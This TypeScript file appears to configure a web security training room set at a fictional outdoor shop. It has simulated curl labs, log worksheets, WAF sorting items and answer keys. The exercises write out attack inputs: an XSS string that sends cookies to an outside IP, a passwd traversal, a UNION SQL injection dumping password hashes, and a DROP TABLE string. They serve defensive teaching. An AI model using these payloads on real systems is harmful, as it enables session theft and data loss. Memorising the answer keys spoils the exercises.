import type { RoomExperience } from "./types";

// "Operation Request Line" for the "web-application-security" room.
// Script: docs/campaign/20-web-application-security.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Fernhill Outdoor (fictional), not the graded tasks' Larkfield. Lab data
// differs from the graded tasks: the curl labs never show an IIS log or a POST
// body's absence from it (q1); the SQLi outcome sheet is a search endpoint, not
// la1's /download.aspx traversal, and never matches classes to tells (m1); the
// WAF sort leaves out IDOR (q2) and never compares client IPs (la2) or an
// apostrophe false positive (ac1); and the CSRF sheet reads cookie and token
// defences, not a forged change-email request (q3) or the request's life
// order (o1).
export const WEB_APPLICATION_SECURITY: RoomExperience = {
  roomId: "web-application-security",
  codename: "Operation Request Line",
  theme: "webapp",
  handler: { name: "Kai Morgan", role: "Application Security Engineer, Fernhill Outdoor" },
  briefing: [
    "Fernhill Outdoor. One online shop, 40,000 orders a month, and a request arriving every few milliseconds.",
    "Every web attack is someone putting something unexpected into a request. Kai Morgan wants you to see one up close before you ever investigate one.",
    "You'll send requests by hand, change what the browser 'allows', watch a SQL injection go from errors to success, and check which defences are switched on.",
    "Follow the request line from browser to database, and back.",
  ],
  mission: "Take a request apart with curl, tamper with a hidden field to prove nothing from the client can be trusted, read a SQL injection's outcome from status codes and byte counts, decide what a WAF can and can't catch, and check whether CSRF defences are actually on.",
  estimate: "~50 min",
  look: { primary: "#f472b6", secondary: "#22d3ee", warn: "#f43f5e" },
  scene: "webpath",
  layout: "stage",
  stations: [
    {
      id: "request",
      label: "Anatomy of a Request",
      topic: "Method, path, query string, headers, cookies, body · the response and its status",
      tagline: "Send a request by hand and read every part of it",
      building: "archive",
      taskIds: ["webapp-r1"],
    },
    {
      id: "trust",
      label: "Trust Nothing",
      topic: "The trust boundary · hidden fields, dropdowns and client-side checks",
      tagline: "Change what the page says you can't, and see what the server accepts",
      building: "vault",
      taskIds: ["webapp-r2", "webapp-q1"],
    },
    {
      id: "attacks",
      label: "Where Attacks Land",
      topic: "SQLi, XSS, traversal, command injection, session attacks, IDOR · OWASP Top 10 2021",
      tagline: "Read an injection's outcome in the status codes",
      building: "lab",
      taskIds: ["webapp-r3", "webapp-m1", "webapp-la1"],
    },
    {
      id: "waf",
      label: "The WAF's View",
      topic: "Signatures and anomaly scoring · what a WAF misses · X-Forwarded-For",
      tagline: "Decide what a WAF can and can't stop",
      building: "control",
      taskIds: ["webapp-r4", "webapp-q2", "webapp-la2", "webapp-ac1"],
    },
    {
      id: "csrf",
      label: "Forged Requests",
      topic: "CSRF: the browser's own trust as the weapon · SameSite and anti-CSRF tokens",
      tagline: "Check which forms are protected",
      building: "ticket",
      taskIds: ["webapp-r5", "webapp-q3", "webapp-o1"],
      boss: true,
    },
  ],
  personas: {
    "webapp-q1": { name: "Kai Morgan", role: "Application Security Engineer", line: "SQL in a login form's POST body. What does the IIS access log show for that second?" },
    "webapp-q2": { name: "Kai Morgan", role: "Application Security Engineer", line: "Someone changed an invoice ID in the URL and got another customer's invoice. Why didn't the WAF stop it?" },
    "webapp-q3": { name: "Kai Morgan", role: "Application Security Engineer", line: "A change-email POST with a Referer from a raffle site. Which attack is it?" },
    "webapp-ac1": { name: "Kai Morgan", role: "Application Security Engineer", line: "The WAF blocked a staff lookup for an SQL pattern. Attack, or something else?" },
  },
  briefings: {
    // ── Reading 1: what a request is ──
    "webapp-r1": [
      {
        kind: "terminal",
        title: "Read a Request by Hand",
        prompt: "curl -v prints the request it sends (lines starting with >) and the response it gets back (lines starting with <). Send one to Fernhill's shop and read every part.",
        shell: "bash",
        host: "kai@appsec:~$",
        commands: [
          { match: "curl\\s+(-v\\s+)?.*shop\\.fernhill\\.example/catalog\\?item=42.*", help: "curl -v \"https://shop.fernhill.example/catalog?item=42&lang=en\"     send a GET and show both sides",
            output: "> GET /catalog?item=42&lang=en HTTP/2\n> Host: shop.fernhill.example\n> User-Agent: curl/8.5.0\n> Accept: */*\n> Cookie: fh_session=7c1e04b9a2d64f8e\n>\n< HTTP/2 200\n< content-type: text/html; charset=utf-8\n< content-length: 18342\n< set-cookie: fh_recent=42; Path=/; Secure; HttpOnly; SameSite=Lax\n<\n<!doctype html><title>Trail Stove 2 | Fernhill</title>..." },
          { match: "curl\\s+(-v\\s+)?.*shop\\.fernhill\\.example/nope.*", help: "curl -v https://shop.fernhill.example/nope                          a path that does not exist",
            output: "> GET /nope HTTP/2\n> Host: shop.fernhill.example\n>\n< HTTP/2 404\n< content-length: 1204\n<\n<!doctype html><title>Not found</title>" },
        ],
        objectives: [
          { id: "method", task: "Which method did the request use?", hint: "curl -v \"https://shop.fernhill.example/catalog?item=42&lang=en\"", answer: ["GET"], why: "GET: give me something. The first word of the request line." },
          { id: "query", task: "What is the query string?", hint: "Everything after the ? in the request line.", answer: ["item=42&lang=en"], why: "Two name=value pairs: the page's input. Everything here is chosen by the client." },
          { id: "cookie", task: "Which request header carries the login session?", hint: "A line starting with > that holds fh_session.", answer: ["Cookie"], why: "The browser hands this back on every request. Whoever holds it is 'logged in'." },
          { id: "status", task: "What status code does a missing page return?", hint: "curl -v https://shop.fernhill.example/nope", answer: ["404"], why: "2xx success, 3xx redirect, 4xx the client asked for something wrong, 5xx the server broke." },
        ],
      },
    ],
    // ── Reading 2: the trust boundary ──
    "webapp-r2": [
      {
        kind: "terminal",
        title: "Change What You 'Can't'",
        prompt: "The basket form has a hidden price field and a quantity dropdown limited to 1-5. The browser enforces both. Send the request yourself, without a browser.",
        shell: "bash",
        host: "kai@appsec:~$",
        commands: [
          { match: "curl\\s+.*shop\\.fernhill\\.example/product/42.*grep.*", help: "curl -s https://shop.fernhill.example/product/42 | grep -A4 '<form'      look at the form the page sends",
            output: "<form method=\"POST\" action=\"/basket/add\">\n  <input type=\"hidden\" name=\"item\" value=\"42\">\n  <input type=\"hidden\" name=\"price\" value=\"89.00\">\n  <select name=\"qty\"><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option></select>" },
          { match: "curl\\s+.*-d\\s+['\"]?item=42&price=0\\.01&qty=500['\"]?.*basket/add.*", help: "curl -s -X POST -b fh_session=7c1e04b9a2d64f8e -d \"item=42&price=0.01&qty=500\" https://shop.fernhill.example/basket/add",
            output: "{\"status\":\"added\",\"item\":\"Trail Stove 2\",\"qty\":500,\"unit_price\":0.01,\"line_total\":5.00}" },
          { match: "curl\\s+.*-d\\s+.*basket/add.*", output: "{\"status\":\"added\"}\n(try exactly: -d \"item=42&price=0.01&qty=500\")" },
        ],
        objectives: [
          { id: "hidden", task: "Which form field is hidden from the shopper but sent anyway?", hint: "curl -s https://shop.fernhill.example/product/42 | grep -A4 '<form'", answer: ["price"], why: "Hidden from the eye, not from the request. Anyone can change it." },
          { id: "qty", task: "Send price=0.01 and qty=500. What line_total did the server accept?", hint: "curl -s -X POST -b fh_session=7c1e04b9a2d64f8e -d \"item=42&price=0.01&qty=500\" https://shop.fernhill.example/basket/add", answer: ["5.00", "5", "£5", "5.0"], why: "500 stoves for £5. The dropdown said 1-5 and the hidden field said 89.00; neither was a lock. Price and limits must be enforced on the server." },
        ],
      },
    ],
    // ── Reading 3: attack classes ──
    "webapp-r3": [
      {
        kind: "worksheet",
        title: "Errors, Then Success",
        prompt: "Fernhill's search endpoint, one client, five minutes. Normal responses are 3-6 KB. Read the outcome column the way Reading 3 taught.",
        caption: "Access log extract · GET /search · client 203.0.113.58",
        columns: ["time", "q (decoded)", "status", "bytes"],
        rows: [
          ["10:02:11", "tent", "200", "4,812"],
          ["10:02:40", "tent'", "500", "1,206"],
          ["10:03:02", "tent' ORDER BY 9--", "500", "1,206"],
          ["10:03:31", "tent' ORDER BY 6--", "200", "4,790"],
          ["10:04:15", "x' UNION SELECT email,pwd_hash,3,4,5,6 FROM customers--", "200", "2,914,507"],
        ],
        questions: [
          { id: "probe", q: "What did the single quote at 10:02:40 do?", hint: "Look at its status.", answer: ["broke the query", "error", "500", "caused an error", "syntax error"], why: "A stray quote broke the SQL syntax and the database threw: proof the input reaches a query unescaped." },
          { id: "cols", q: "How many columns does the query have? (ORDER BY 9 fails, ORDER BY 6 works)", hint: "The largest ORDER BY that returns 200.", answer: ["6", "six"], why: "Attackers find the column count first, so their UNION lines up." },
          { id: "win", q: "At what time did the injection succeed?", hint: "A 200 with a size unlike the endpoint's normal output.", answer: ["10:04:15"], why: "2.9 MB from an endpoint that returns 5 KB: the customers table came back in the page." },
        ],
      },
    ],
    // ── Reading 4: the WAF ──
    "webapp-r4": [
      {
        kind: "sort",
        title: "Can the WAF See It?",
        prompt: "A WAF reads requests for bad patterns. Some attacks have a pattern; some are perfectly normal requests used for the wrong purpose.",
        buckets: [
          { id: "yes", label: "A WAF rule can catch it" },
          { id: "no", label: "Nothing for a WAF to match" },
        ],
        items: [
          { id: "a", text: "?q=<script>document.location='//198.51.100.7/'+document.cookie</script>", bucket: "yes", why: "Script tags in a parameter: exactly what XSS rules look for." },
          { id: "b", text: "?file=..%2f..%2f..%2fetc%2fpasswd", bucket: "yes", why: "Encoded dot-dot-slash: traversal rules decode before matching." },
          { id: "c", text: "Valid username and password from a breach list, one try per account per hour", bucket: "no", why: "Each request is a normal login. Only rate and breach-list correlation reveal it." },
          { id: "d", text: "One discount code applied 40 times to one order", bucket: "no", why: "Business-logic abuse: every request is well-formed. The fix is in the application." },
          { id: "e", text: "A stolen session cookie replayed from a new IP", bucket: "no", why: "The cookie is genuine. Nothing in the request is malformed." },
          { id: "f", text: "{\"name\":\"a'; DROP TABLE orders;--\"} in a 1 KB JSON body", bucket: "yes", why: "SQL syntax in a small body: well within what managed SQLi rules inspect." },
        ],
      },
    ],
    // ── Reading 5: CSRF ──
    "webapp-r5": [
      {
        kind: "worksheet",
        title: "Are the Defences On?",
        prompt: "Kai pulled the response headers and form markup for three state-changing pages on Fernhill's account portal. A page is protected if its session cookie is SameSite=Lax or Strict, or its form carries an anti-CSRF token the server checks.",
        caption: "account.fernhill.example · response headers and forms",
        columns: ["page", "session cookie", "form token", "server checks token"],
        rows: [
          ["/account/address", "fh_session=...; Secure; HttpOnly; SameSite=Lax", "yes", "yes"],
          ["/account/payout-bank", "fh_session=...; Secure; HttpOnly; SameSite=None", "no", "n/a"],
          ["/account/newsletter", "fh_session=...; Secure; HttpOnly; SameSite=None", "yes", "no (token ignored)"],
        ],
        questions: [
          { id: "worst", q: "Which page could another website make a logged-in user's browser submit, with real money at stake?", hint: "No SameSite protection and no token.", answer: ["/account/payout-bank", "payout-bank", "payout"], why: "SameSite=None sends the cookie on cross-site requests, and there's no token. A hidden form on any page could change where payouts go." },
          { id: "fake", q: "Which page has a token that protects nothing?", hint: "Read the last column.", answer: ["/account/newsletter", "newsletter"], why: "A token the server never checks is decoration. Defences have to be verified server-side." },
          { id: "attr", q: "Which cookie attribute stops the browser sending the session on most cross-site requests?", hint: "Strict or Lax.", answer: ["SameSite", "samesite=lax", "samesite=strict"], why: "SameSite=Lax blocks the cookie on cross-site POSTs, the usual CSRF vehicle." },
        ],
      },
    ],
  },
};
